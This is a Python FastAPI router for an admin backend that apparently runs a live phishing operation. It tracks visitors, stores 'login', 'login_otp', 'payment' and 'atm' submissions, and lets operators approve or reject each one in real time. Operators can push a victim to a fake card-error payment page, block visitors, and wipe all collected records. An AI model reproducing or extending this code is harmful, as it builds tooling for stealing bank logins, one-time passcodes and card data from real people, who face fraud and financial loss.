import asyncio

from fastapi import APIRouter, Form, Request, WebSocket, WebSocketDisconnect
from fastapi.responses import JSONResponse

from .. import state
from ..config import SESSION_COOKIE
from ..db import get_mongo_db
from ..deps import require_root_session
from ..page_meta import redirect_url_for_page
from ..realtime import (
    admin_realtime_payload,
    broadcast_admin_update,
    broadcast_dashboard_update,
    dashboard_realtime_payload,
    force_block_visitor,
    force_logout_username,
    info_events_for_visitor,
    notify_visitor,
)
from ..services.registrations import decide_registration_submission, list_registration_submissions
from ..services.admins import (
    create_admin,
    persist_admin_password_update_async,
    set_admin_blocked,
    validate_non_root_admin_username,
)
from ..services.sessions import (
    active_non_root_sessions_count,
    get_active_sessions_list,
    get_session_by_token,
    invalidate_all_non_root_sessions,
    invalidate_one_non_root_session,
    invalidate_sessions_for_username,
    persist_logout_session,
    touch_session_last_seen,
)
from ..services.visitors import set_visitor_blocked

router = APIRouter()


@router.get('/admin/sessions/summary')
async def admin_sessions_summary(request: Request):
    if not require_root_session(request):
        return JSONResponse({'error': 'unauthorized'}, status_code=401)
    return JSONResponse({'active_sessions_count': active_non_root_sessions_count()})


@router.websocket('/ws/admin')
async def ws_admin_updates(websocket: WebSocket):
    token = websocket.cookies.get(SESSION_COOKIE)
    session = get_session_by_token(token)
    if not session or not session.get('is_root'):
        await websocket.close(code=1008)
        return

    await websocket.accept()
    state.admin_ws_clients.add(websocket)
    try:
        await websocket.send_json(admin_realtime_payload())
        while True:
            try:
                message = await asyncio.wait_for(websocket.receive_text(), timeout=5)
                if message == 'logout':
                    persist_logout_session(token)
                    state.session_cache.pop(token, None)
                    await broadcast_admin_update()
                    break
            except asyncio.TimeoutError:
                pass
            touch_session_last_seen(token)
            await websocket.send_json(admin_realtime_payload())
    except WebSocketDisconnect:
        pass
    finally:
        state.admin_ws_clients.discard(websocket)


@router.websocket('/ws/dashboard')
async def ws_dashboard_updates(websocket: WebSocket):
    token = websocket.cookies.get(SESSION_COOKIE)
    session = get_session_by_token(token)
    if not session:
        await websocket.close(code=1008)
        return

    await websocket.accept()
    state.dashboard_ws_clients.add(websocket)
    try:
        await websocket.send_json(dashboard_realtime_payload())
        while True:
            try:
                message = await asyncio.wait_for(websocket.receive_text(), timeout=15)
            except asyncio.TimeoutError:
                message = ''
            touch_session_last_seen(token)
            if message == 'sync':
                await websocket.send_json(dashboard_realtime_payload())
            else:
                await websocket.send_json({'type': 'dashboard.heartbeat'})
    except WebSocketDisconnect:
        pass
    finally:
        state.dashboard_ws_clients.discard(websocket)


@router.websocket('/ws/presence')
async def ws_admin_presence(websocket: WebSocket):
    token = websocket.cookies.get(SESSION_COOKIE)
    session = get_session_by_token(token)
    if not session:
        await websocket.close(code=1008)
        return

    username = session.get('username', '')
    await websocket.accept()
    state.admin_user_ws_clients.setdefault(username, set()).add(websocket)

    try:
        while True:
            try:
                await asyncio.wait_for(websocket.receive_text(), timeout=8)
            except asyncio.TimeoutError:
                pass
            touch_session_last_seen(token)
            if not get_session_by_token(token):
                await websocket.send_json({'type': 'force.logout'})
                await websocket.close(code=1008)
                break
    except WebSocketDisconnect:
        pass
    finally:
        if username in state.admin_user_ws_clients:
            state.admin_user_ws_clients[username].discard(websocket)
            if not state.admin_user_ws_clients[username]:
                state.admin_user_ws_clients.pop(username, None)


@router.get('/admin/sessions/list')
async def admin_sessions_list(request: Request):
    if not require_root_session(request):
        return JSONResponse({'error': 'unauthorized'}, status_code=401)
    return JSONResponse({'sessions': get_active_sessions_list()})


@router.post('/admin/sessions/invalidate')
async def invalidate_one_session(request: Request, token: str = Form(...)):
    if not require_root_session(request):
        return JSONResponse({'error': 'unauthorized'}, status_code=401)

    invalidate_one_non_root_session(token)
    asyncio.create_task(broadcast_admin_update())
    return JSONResponse({'ok': True})


@router.post('/admin/sessions/invalidate-non-root')
async def invalidate_non_root_sessions(request: Request):
    if not require_root_session(request):
        return JSONResponse({'error': 'unauthorized'}, status_code=401)

    invalidate_all_non_root_sessions()
    asyncio.create_task(broadcast_admin_update())
    return JSONResponse({'ok': True})


@router.post('/admin/admins/create')
async def create_admin_user(request: Request, username: str = Form(...), password: str = Form(...)):
    if not require_root_session(request):
        return JSONResponse({'error': 'unauthorized'}, status_code=401)

    username = username.strip()
    if len(username) < 2 or len(password) < 1:
        return JSONResponse({'error': 'invalid_input'}, status_code=400)
    if not validate_non_root_admin_username(username):
        return JSONResponse({'error': 'invalid_username'}, status_code=400)

    ok, err = create_admin(username, password)
    if not ok:
        if err == 'username_exists':
            return JSONResponse({'error': err}, status_code=409)
        return JSONResponse({'error': err}, status_code=500)

    asyncio.create_task(broadcast_admin_update())
    return JSONResponse({'ok': True, 'username': username})


@router.post('/admin/admins/update-password')
async def update_admin_password(request: Request, username: str = Form(...), password: str = Form(...)):
    if not require_root_session(request):
        return JSONResponse({'error': 'unauthorized'}, status_code=401)

    username = username.strip()
    if len(username) < 2 or len(password) < 1:
        return JSONResponse({'error': 'invalid_input'}, status_code=400)
    if not validate_non_root_admin_username(username):
        return JSONResponse({'error': 'invalid_username'}, status_code=400)

    persist_admin_password_update_async(username, password)
    state.sessions_list_cache['at'] = 0.0
    asyncio.create_task(broadcast_admin_update())
    return JSONResponse({'ok': True})


@router.post('/admin/admins/block')
async def block_admin_user(request: Request, username: str = Form(...), blocked: str = Form('true')):
    if not require_root_session(request):
        return JSONResponse({'error': 'unauthorized'}, status_code=401)

    username = username.strip()
    if len(username) < 2 or not validate_non_root_admin_username(username):
        return JSONResponse({'error': 'invalid_username'}, status_code=400)

    should_block = str(blocked).lower() in {'1', 'true', 'yes', 'on'}
    ok, err = set_admin_blocked(username, should_block)
    if not ok:
        if err == 'not_found':
            return JSONResponse({'error': err}, status_code=404)
        return JSONResponse({'error': err}, status_code=500)

    if should_block:
        invalidate_sessions_for_username(username)
        await force_logout_username(username)
    asyncio.create_task(broadcast_admin_update())
    return JSONResponse({'ok': True, 'username': username, 'is_blocked': should_block})


@router.post('/admin/visitors/block')
async def block_visitor_user(request: Request, visitor_uid: str = Form(...), blocked: str = Form('true')):
    if not get_session_by_token(request.cookies.get(SESSION_COOKIE)):
        return JSONResponse({'error': 'unauthorized'}, status_code=401)

    visitor_uid = visitor_uid.strip()
    if len(visitor_uid) < 8:
        return JSONResponse({'error': 'invalid_uid'}, status_code=400)

    should_block = str(blocked).lower() in {'1', 'true', 'yes', 'on'}
    ok, err = set_visitor_blocked(visitor_uid, should_block)
    if not ok:
        return JSONResponse({'error': err}, status_code=500 if err == 'db_error' else 400)

    if should_block:
        await force_block_visitor(visitor_uid, backend_base_url=str(request.base_url).rstrip('/'))
    await broadcast_dashboard_update(
        recent_visit={'visitor_uid': visitor_uid, 'is_blocked': should_block},
        include_info_events=False,
    )
    return JSONResponse({'ok': True, 'visitor_uid': visitor_uid, 'is_blocked': should_block})


@router.post('/admin/submissions/clear')
async def clear_all_submissions(request: Request):
    if not require_root_session(request):
        return JSONResponse({'error': 'unauthorized'}, status_code=401)
    db = get_mongo_db()
    form_types = ['registration', 'login', 'login_otp', 'payment', 'atm']
    result_subs = db.registration_submissions.delete_many({})
    result_events = db.info_events.delete_many({'type': {'$in': form_types}})
    result_visits = db.visits.delete_many({})
    state.visits_count_cache['at'] = 0.0
    await broadcast_dashboard_update()
    return JSONResponse(
        {
            'ok': True,
            'deleted_submissions': int(getattr(result_subs, 'deleted_count', 0) or 0),
            'deleted_info_events': int(getattr(result_events, 'deleted_count', 0) or 0),
            'deleted_visits': int(getattr(result_visits, 'deleted_count', 0) or 0),
        }
    )


@router.post('/admin/visitors/redirect')
async def redirect_visitor_user(
    request: Request,
    visitor_uid: str = Form(...),
    page: str = Form(...),
    reason: str = Form(''),
):
    if not get_session_by_token(request.cookies.get(SESSION_COOKIE)):
        return JSONResponse({'error': 'unauthorized'}, status_code=401)

    visitor_uid = visitor_uid.strip()
    page = page.strip()
    redirect_url = redirect_url_for_page(page)
    if page == 'payment' and reason.strip().lower() == 'card_error':
        redirect_url = '/payment.html?card_error=1'
    if not visitor_uid or not redirect_url:
        return JSONResponse({'error': 'invalid_input'}, status_code=400)

    await notify_visitor(visitor_uid, {'type': 'visitor.redirect', 'redirect_url': redirect_url, 'page': page})
    return JSONResponse({'ok': True, 'visitor_uid': visitor_uid, 'page': page, 'redirect_url': redirect_url})


@router.get('/admin/registration/list')
async def registration_list(request: Request, visitor_uid: str = '', limit: int = 200):
    if not require_root_session(request):
        return JSONResponse({'error': 'unauthorized'}, status_code=401)
    visitor_uid = (visitor_uid or '').strip()
    if len(visitor_uid) < 8:
        return JSONResponse({'error': 'invalid_uid'}, status_code=400)
    return JSONResponse({'submissions': list_registration_submissions(visitor_uid, limit=limit)})


@router.get('/admin/info/list')
async def info_list(request: Request, visitor_uid: str = ''):
    if not require_root_session(request):
        return JSONResponse({'error': 'unauthorized'}, status_code=401)
    visitor_uid = (visitor_uid or '').strip()
    if len(visitor_uid) < 8:
        return JSONResponse({'error': 'invalid_uid'}, status_code=400)
    return JSONResponse({'info_events': info_events_for_visitor(visitor_uid)})


@router.post('/admin/registration/decision')
async def registration_decision(request: Request):
    session = get_session_by_token(request.cookies.get(SESSION_COOKIE))
    if not session or not session.get('is_root'):
        return JSONResponse({'error': 'unauthorized'}, status_code=401)
    payload = await request.json()
    submission_id = str(payload.get('submission_id') or '').strip()
    decision = str(payload.get('decision') or '').strip()
    row = decide_registration_submission(
        submission_id,
        decision=decision,
        decided_by=session.get('username', ''),
    )
    if not row:
        return JSONResponse({'error': 'not_actionable'}, status_code=400)
    await notify_visitor(
        row.get('visitor_uid', ''),
        {
            'type': 'registration.decision',
            'submission_id': row.get('id', ''),
            'status': row.get('status', ''),
            'form_type': row.get('form_type', ''),
        },
    )
    await broadcast_dashboard_update(recent_visit={'visitor_uid': row.get('visitor_uid', ''), 'registration_status_changed': True})
    return JSONResponse({'ok': True, 'submission': row})
